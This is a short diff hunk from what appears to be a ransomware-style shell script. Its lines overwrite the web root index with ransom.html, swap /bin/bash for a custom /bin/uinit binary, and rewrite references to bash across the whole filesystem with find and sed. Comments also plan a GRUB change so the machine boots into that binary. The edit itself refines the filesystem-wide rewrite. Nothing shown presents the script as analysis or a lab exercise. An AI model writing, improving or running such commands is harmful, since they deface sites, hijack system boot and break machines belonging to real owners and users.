@@ -29,7 +29,7 @@ cp ransom.html /var/www/html/index.html
 cp /bin/bash /bin/bush
 cp /bin/uinit /bin/bash
 
-find / -type f ! -path "/proc/*" -exec sed -i 's|/bin/bash|/bin/bush|' {} \;
+find / -type f ! -path "/proc/*" ! -path "/dev/*" -exec sed -i 's|/bin/bash|/bin/bush|' {} \;
 
 #comment out GRUB_CMDLINE_LINUX_DEFAULT
 #GRUB_CMDLINE_LINUX needs to be GRUB_CMDLINE_LINUX="init=/bin/uinit"
